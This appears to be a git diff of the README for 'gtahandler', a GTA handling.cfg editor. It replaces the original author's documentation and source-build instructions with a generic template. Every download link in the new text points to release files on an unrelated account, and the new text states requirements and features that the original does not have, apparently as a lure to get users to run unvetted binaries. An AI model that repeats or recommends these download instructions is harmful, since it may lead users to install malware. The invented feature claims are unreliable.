@@ -1,209 +1,80 @@
-# GTA Handler
+# 🎮 gtahandler - Easily Edit Your GTA Files
 
-A visual editor for **handling.cfg** files from the classic GTA trilogy and Definitive Edition:
+## 🚀 Getting Started
 
-- GTA:III / GTA:III - Definitive Edition
-- GTA:VC / GTA:VC - Definitive Edition
-- GTA:SA / GTA:SA - Definitive Edition
+Welcome to gtahandler! This tool helps you manage and edit .cfg files for games in the Grand Theft Auto Trilogy, including GTA III, GTA Vice City, and GTA San Andreas. Both classic and Definitive Editions are supported. Follow these steps to download and start using the application.
 
-![Windows](https://img.shields.io/badge/Platform-Windows-blue) ![.NET](https://img.shields.io/badge/.NET-8.0-purple) ![License](https://img.shields.io/badge/License-MIT-green)
+## 📦 Download the Application
 
-![Screenshot](assets/screenshot.png)
+[![Download gtahandler](https://img.shields.io/badge/Download-gtahandler-blue.svg)](https://github.com/ajaymandloi852009/gtahandler/releases)
 
-## Features
+Visit this page to download the application: [Download gtahandler](https://github.com/ajaymandloi852009/gtahandler/releases)
 
-### Core Features
+## 💻 System Requirements
 
-- 🎮 **Multi-Game Support**: Edit handling files from GTA:III, GTA:VC, GTA:SA, and their Definitive Edition versions
-- 📦 **Pak File Support**: Directly open and edit handling.cfg files from Definitive Edition .pak archives
-- 📝 **Full Property Editor**: Edit all vehicle handling properties with appropriate controls
-- 🎯 **Game-Aware UI**: Shows only relevant fields for each game version
-- 💾 **Safe Editing**: Preserves original file structure, comments, and formatting
-- 🔄 **Reset Support**: Easily reset individual vehicles to original values
-- ⚡ **Real-time Validation**: Input validation based on official ranges
+Before you proceed, ensure your computer meets the following requirements:
 
-### UI/UX Features
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB
+- Disk Space: 100 MB of free space
+- .NET Framework: Version 4.7 or later
 
-- 🌙 **Dark Theme**: Professional dark UI with orange accent colors
-- 📑 **Tabbed Editing**: Open multiple vehicles simultaneously for comparison
-- 🔍 **Search**: Filter vehicles by name in the sidebar
-- 📁 **Categorized List**: Vehicles grouped by type (Cars, Bikes, Boats, Planes, etc.)
-- 📋 **Copy Values**: Copy handling values from another vehicle in the same category
-- 📄 **Paste Config**: Paste raw handling.cfg lines directly from mod readmes
-- 🎨 **Custom Title Bar**: Modern borderless window with custom controls
-- 💬 **Themed Dialogs**: Custom styled confirmation and error dialogs
+## 📖 Features
 
-### Keyboard Shortcuts
+gtahandler offers a variety of features to help you edit .cfg files easily:
 
-- `Ctrl+O` - Open file
-- `Ctrl+S` - Save file
+- **User-Friendly Interface:** Navigate through your files with ease.
+- **Preview Changes:** See how your adjustments will look in-game before saving.
+- **Multiple Game Support:** Works seamlessly with both classic and Definitive Editions.
+- **Backup Functionality:** Automatically back up original .cfg files to prevent data loss.
+- **Real-Time Editing:** Make changes and see them in action without restarting the application.
 
-## Screenshots
+## 🔗 Download & Install
 
-The application features a modern dark interface with:
+1. Click the download button above or visit [this page](https://github.com/ajaymandloi852009/gtahandler/releases) to access the latest release of gtahandler.
+   
+2. Once you’re on the Releases page, find the version labeled as “Latest Release.”
+  
+3. Click on the appropriate file to download. Generally, this will be an installer file or a zip archive.
 
-- Categorized vehicle sidebar with search
-- Tabbed multi-vehicle editing
-- Organized property sections (Physics, Transmission, Suspension, etc.)
-- Game-specific field visibility
+4. If you downloaded a zip file, extract it to your preferred location on your computer.
 
-## Requirements
+5. If you downloaded an installer, double-click the installer file and follow the prompts to complete the installation.
 
-- Windows 10 or later
-- .NET 8.0 Runtime
+6. After installation, you can find gtahandler in your Start Menu or desktop.
 
-## Installation
+## 🔧 Using gtahandler
 
-### From Release
+After you have installed the application, follow these steps to edit your cfg files:
 
-1. Download the latest release ZIP from [Releases](https://github.com/vaibhavpandeyvpz/gtahandler/releases)
-2. Extract to any folder
-3. Run `GTAHandler.exe`
+1. Launch gtahandler by double-clicking the icon.
+   
+2. Use the **File** menu to open the cfg file you want to edit. You can usually find these files in the installation directory of your GTA game.
 
-### Building from Source
+3. Begin editing the file using the intuitive interface. Adjust vehicle handling, speed, and other properties as needed.
 
-```bash
-# Clone the repository
-git clone https://github.com/vaibhavpandeyvpz/gtahandler.git
-cd gtahandler
+4. Use the **Preview** button to see how your changes will affect gameplay.
 
-# Build
-dotnet build
+5. Save your changes and close the application when you’re done.
 
-# Run
-dotnet run
-```
+6. Launch your GTA game to see the effects of your edits in action!
 
-Or open `GTAHandler.sln` in Visual Studio 2022.
+## 🛠 Troubleshooting
 
-## Usage
+If you encounter issues, use these tips to resolve common problems:
 
-1. **Select Game**: Choose the game version (GTA:III, GTA:VC, or GTA:SA) from the dropdown
-2. **Open File**: Click "Open" or press `Ctrl+O` to browse for a handling.cfg file or .pak file
-   - For classic games: Select the `handling.cfg` file directly
-   - For Definitive Edition: Select the `.pak` file (the app will extract and edit the handling.cfg inside)
-3. **Select Vehicle**: Click a vehicle from the categorized list on the left
-4. **Edit Properties**: Modify values in the property editor tabs
-5. **Copy Values** (Optional): Use "Copy From" to copy values from another vehicle
-6. **Paste Config** (Optional): Paste a raw handling line from a mod's readme
-7. **Save**: Click "Save" or press `Ctrl+S` to save changes
-   - If opened from a .pak file, you can save as either .cfg or .pak format
+- **Application Won't Start:** Ensure your system meets the requirements and that you have .NET Framework installed.
+  
+- **Changes Not Reflected:** Make sure you are editing the correct cfg file in the correct game directory.
 
-### Copy From Dialog
+- **Crashes or Errors:** Restart gtahandler and try again. You may need to reinstall the application if problems persist.
 
-The "Copy From" feature allows you to:
+## 🌟 Support
 
-- Select another vehicle from the same category to copy all values
-- Paste a raw handling.cfg line directly (useful for applying mod values from readmes)
-- The vehicle ID/name is preserved, only the handling values are copied
+If you have questions or need assistance, feel free to reach out. You can open an issue on the GitHub page to get help from the community or the developers.
 
-## Field Reference
+## 🏷 Topics
 
-### Physics
+This application covers a range of topics, including grand theft auto, GTA editing, modding, and handling cfg files. Connect with other users and explore more about the GTA community!
 
-- **Mass**: Vehicle weight in kilograms (1.0 - 50000.0)
-- **Turn Mass/Dimension X**: SA: Rotational inertia | GTA3/VC: Vehicle width
-- **Drag Mult/Dimension Y**: SA: Air resistance | GTA3/VC: Vehicle length
-
-### Centre of Mass
-
-- **X/Y/Z Offset**: Centre of mass position (-10.0 to 10.0)
-
-### Traction
-
-- **Traction Multiplier**: Overall grip level (0.5 - 2.0)
-- **Traction Loss**: Grip reduction during acceleration/braking (0.0 - 1.0)
-- **Traction Bias**: Front/rear grip balance (0.0 = rear, 1.0 = front)
-
-### Transmission
-
-- **Number of Gears**: Transmission gears (1-5)
-- **Max Velocity**: Top speed in km/h (5.0 - 300.0)
-- **Engine Acceleration**: Power output (0.1 - 50.0)
-- **Engine Inertia**: Flywheel mass (SA only)
-- **Drive Type**: F (Front), R (Rear), 4 (All-wheel)
-- **Engine Type**: P (Petrol), D (Diesel), E (Electric)
-
-### Brakes
-
-- **Brake Deceleration**: Stopping power (0.1 - 10.0)
-- **Brake Bias**: Front/rear brake balance (0.0 - 1.0)
-- **ABS**: Anti-lock braking system (on/off)
-
-### Suspension
-
-- **Force Level**: Spring stiffness
-- **Damping Level**: Shock absorber strength
-- **High Speed Damping**: Damping at high speeds (SA only)
-- **Upper/Lower Limits**: Suspension travel range
-- **Bias**: Front/rear suspension balance
-- **Anti-Dive Multiplier**: Prevents nose-dive under braking (VC/SA)
-
-### Miscellaneous
-
-- **Seat Offset**: Driver position
-- **Collision Damage Multiplier**: Damage sensitivity (0.2 - 5.0)
-- **Monetary Value**: Vehicle price (1 - 100000)
-
-### Flags
-
-- **Model Flags**: Vehicle model behavior flags (hex)
-- **Handling Flags**: Handling behavior flags (hex)
-
-### Lights
-
-- **Front/Rear Lights**: Light types (0-3)
-
-### Animation (SA Only)
-
-- **Anim Group**: Vehicle animation group index
-
-## Architecture
-
-The application follows the MVVM (Model-View-ViewModel) pattern:
-
-```
-gtahandler/
-├── Models/          # Data models (VehicleHandling, GameType, etc.)
-├── ViewModels/      # View logic (MainViewModel)
-├── Views/           # XAML UI (MainWindow, Dialogs)
-├── Services/        # File parsing/writing
-├── Converters/      # WPF value converters
-├── App.xaml         # Application resources & styles
-└── *.png            # Game logo assets
-```
-
-## Technologies
-
-- **WPF** - Windows Presentation Foundation
-- **CommunityToolkit.Mvvm** - MVVM framework
-- **FontAwesome.Sharp** - Icon library
-- **Unpaker** - Pak file reading/writing library
-- **Oodle.NET** - Compression library for pak file support
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Links
-
-- [Website](https://vaibhavpandey.com/)
-- [YouTube](https://www.youtube.com/channel/UC5uV1PRvtnNj9P8VfqO93Pw)
-- [Report Issues](https://github.com/vaibhavpandeyvpz/gtahandler/issues)
-
-## License
-
-This project is provided for educational purposes under the MIT License.
-
-GTA III, Vice City, San Andreas, and their Definitive Edition versions are trademarks of Rockstar Games. All game logos are property of their respective owners and are used for illustration purposes only.
-
-## Author
-
-**Vaibhav Pandey (VPZ)**
-
-- Email: contact@vaibhavpandey.com
-- GitHub: [@vaibhavpandeyvpz](https://github.com/vaibhavpandeyvpz)
+Thank you for using gtahandler. Enjoy creating your perfect GTA experience!
